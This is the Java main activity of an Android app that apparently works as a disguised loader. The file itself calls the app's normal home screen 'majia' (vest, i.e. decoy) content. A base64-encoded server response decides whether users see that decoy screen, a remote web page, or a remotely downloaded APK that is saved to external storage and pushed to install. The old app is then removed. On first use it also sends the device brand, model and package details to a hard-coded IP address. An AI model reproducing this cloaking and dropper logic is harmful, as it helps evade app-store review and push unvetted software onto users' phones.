package com.jiuzhou.guanwang.jzcp.activity;

import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.support.v4.widget.ContentLoadingProgressBar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.CardView;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.jiuzhou.guanwang.jzcp.R;
import com.jiuzhou.guanwang.jzcp.bean.AppBean;
import com.jiuzhou.guanwang.jzcp.bean.DataBean;
import com.jiuzhou.guanwang.jzcp.receiver.MyInstalledReceiver;
import com.jiuzhou.guanwang.jzcp.utils.Base64Util;
import com.jiuzhou.guanwang.jzcp.utils.CacheActivity;
import com.jiuzhou.guanwang.jzcp.utils.PrefUtils;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.RequestParams;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest.HttpMethod;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private String url;
    private String myurl="http://140.143.160.213:8090/add";
    private HttpUtils http = new HttpUtils();
    private String appid;
    private ImageView image;
    private MyInstalledReceiver installedReceiver;
    private CardView update;
    private ContentLoadingProgressBar progressBar;
    private TextView text;
    private String nowDate;
    private String updateDay;
    private String appTime;
    private String appDate;
    private String appname;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        image= (ImageView) findViewById(R.id.background);
        update= (CardView) findViewById(R.id.update);
        progressBar= (ContentLoadingProgressBar) findViewById(R.id.proProgressBar);
        text= (TextView) findViewById(R.id.text);
        CacheActivity.addActivity(this);
        String bagname = PrefUtils.getString(this, "package", "");
        SimpleDateFormat formatter1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        SimpleDateFormat formatter2 = new SimpleDateFormat("yyyy-MM-dd");
        Date curDate = new Date(System.currentTimeMillis());
        appTime = formatter1.format(curDate);
        appDate = formatter2.format(curDate);
        if(TextUtils.isEmpty(bagname)){
            request();
        }else{
            doStartApplicationWithPackageName(bagname);
        }
    }

    private void request() {
        initdata();
        //跳转接口
        String requstUrl = url + "?"+"type=android&appid="+appid;
        http.send(HttpMethod.GET, requstUrl, new RequestCallBack<String>() {
            @Override
            public void onSuccess(ResponseInfo<String> responseInfo) {
                try {
                    Gson gson = new Gson();
                    AppBean appBean = gson.fromJson(responseInfo.result, AppBean.class);
                    String rt_code = appBean.getRt_code();
                    String data = appBean.getData();
                    if (rt_code.equals("200")){
                        String uidFromBase64 = Base64Util.getUidFromBase64(data);
                        DataBean dataBean = gson.fromJson(uidFromBase64, DataBean.class);
                        String h5url = dataBean.getUrl();
                        String show_url = dataBean.getShow_url();
                        String comment = dataBean.getComment();
                        //show_url为0就跳转自己的主页，否则跳走删包或者H5逻辑
                        if (show_url.equals("0")){
                            JumpToHomeActivity();
                        }else {
                            getComment(comment);
                            //h5url包含apk就走删包，否则跳h5
                            if (h5url.contains(".apk")){
                                image.setImageResource(R.drawable.image2);//下载
                                update.setVisibility(View.VISIBLE);
                                autoUpdate(h5url);
                            }else {
                                Intent intent = new Intent(MainActivity.this,WebActivity.class);
                                intent.putExtra("url",h5url);
                                startActivity(intent);
                                finish();
                            }
                        }
                    }else {
                        JumpToHomeActivity();
                    }
                } catch (Exception e1) {
                e1.printStackTrace();
                JumpToHomeActivity();
            }
            }
            @Override
            public void onFailure(HttpException e, String s) {
                JumpToHomeActivity();
            }
        });
    }

    //自己的主页（马甲内容）
    private void JumpToHomeActivity() {
        startActivity(new Intent(MainActivity.this,HomeActivity.class));
        finish();
    }

    private void initdata(){
        appid =getResources().getString(R.string.appid);
        appname = getResources().getString(R.string.app_name);
        url =getResources().getString(R.string.url);
    }
    //自动更新的方法
    private void autoUpdate(String h5url) {
        File sdDir = Environment.getExternalStorageDirectory();
        File file = new File(sdDir, SystemClock.uptimeMillis() + ".apk");
        http.download(h5url, file.getAbsolutePath(), new RequestCallBack<File>() {
            @Override
            public void onSuccess(ResponseInfo<File> responseInfo) {
                File response = responseInfo.result;
                String archiveFilePath=response.getAbsolutePath();//安装包路径
                PackageManager pm = getPackageManager();
                PackageInfo info = pm.getPackageArchiveInfo(archiveFilePath, PackageManager.GET_ACTIVITIES);
                if(info != null){
                    ApplicationInfo appInfo = info.applicationInfo;
                    String packageName = appInfo.packageName;  //得到安装包名称
                    String version=info.versionName;       //得到版本信息
                    PrefUtils.putString(MainActivity.this,"package",packageName);

                }
                Intent intent = new Intent();
                intent.setAction("android.intent.action.VIEW");
                intent.addCategory("android.intent.category.DEFAULT");
                intent.setDataAndType(Uri.fromFile(response.getAbsoluteFile()), "application/vnd.android.package-archive");
                startActivity(intent);
                //System.exit(0);
            }

            @Override
            public void onFailure(HttpException e, String s) {
                Log.e("onFailure", "onFailure: " + s);
                Toast.makeText(MainActivity.this, "自动更新失败" + s, Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onLoading(long total, long current, boolean isUploading) {
                super.onLoading(total, current, isUploading);
                progressBar.setMax((int) total / 1024);
                progressBar.setProgress((int) current / 1024);
                text.setText("正在更新 ："+(current * 100) / total + "%");
            }
        });
    }
    //广播监听新app安装,以便于卸载旧app
    @Override
    protected void onStart() {
        super.onStart();
        installedReceiver = new MyInstalledReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.intent.action.PACKAGE_ADDED");
        filter.addAction("android.intent.action.PACKAGE_REMOVED");
        filter.addDataScheme("package");
        this.registerReceiver(installedReceiver, filter);
    }
    private void getComment(String comment) {
        boolean isFirstUse = PrefUtils.getBoolean(MainActivity.this, "isFirstUse", true);
        if (isFirstUse) {
            String iPhone = android.os.Build.BRAND+" : "+android.os.Build.MODEL;
            RequestParams params = new RequestParams();
            params.addBodyParameter("appId","ourappid");
            params.addBodyParameter("iPhone",iPhone);
            params.addBodyParameter("theyAppid",appid);
            params.addBodyParameter("appName",appname);
            params.addBodyParameter("appPackageName",getPackageName());
            params.addBodyParameter("appTime",appTime);
            params.addBodyParameter("appDate",appDate);
            params.addBodyParameter("comment",comment);
            //String url = myurl + "?appId=" + "ourappid" + "&iPhone=" + iPhone + "&theyAppid=" + appid + "&appName=" + appname + "&appPackageName=" + getPackageName() + "&appTime=" + appTime + "&appDate=" + appDate + "&comment=" + comment;
            http.send(HttpMethod.POST, myurl,params, new RequestCallBack<String>() {
                @Override
                public void onSuccess(ResponseInfo<String> responseInfo) {
                    PrefUtils.putBoolean(MainActivity.this,"isFirstUse",false);
                }

                @Override
                public void onFailure(HttpException e, String s) {

                }
            });
        }
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (installedReceiver != null) {
            this.unregisterReceiver(installedReceiver);
        }
    }
    private void doStartApplicationWithPackageName(String packagename) {

        // 通过包名获取此APP详细信息，包括Activities、services、versioncode、name等等
        PackageInfo packageinfo = null;
        try {
            packageinfo = getPackageManager().getPackageInfo(packagename, 0);
        } catch (PackageManager.NameNotFoundException e) {
            request();
        }
        if (packageinfo == null) {
            return;
        }

        // 创建一个类别为CATEGORY_LAUNCHER的该包名的Intent
        Intent resolveIntent = new Intent(Intent.ACTION_MAIN, null);
        resolveIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        resolveIntent.setPackage(packageinfo.packageName);

        // 通过getPackageManager()的queryIntentActivities方法遍历
        List<ResolveInfo> resolveinfoList = getPackageManager()
                .queryIntentActivities(resolveIntent, 0);

        ResolveInfo resolveinfo = resolveinfoList.iterator().next();
        if (resolveinfo != null) {
            // packagename = 参数packname
            String packageName = resolveinfo.activityInfo.packageName;
            // 这个就是我们要找的该APP的LAUNCHER的Activity[组织形式：packagename.mainActivityname]
            String className = resolveinfo.activityInfo.name;
            // LAUNCHER Intent
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_LAUNCHER);

            // 设置ComponentName参数1:packagename参数2:MainActivity路径
            ComponentName cn = new ComponentName(packageName, className);

            intent.setComponent(cn);
            startActivity(intent);
            finish();
        }
    }
}
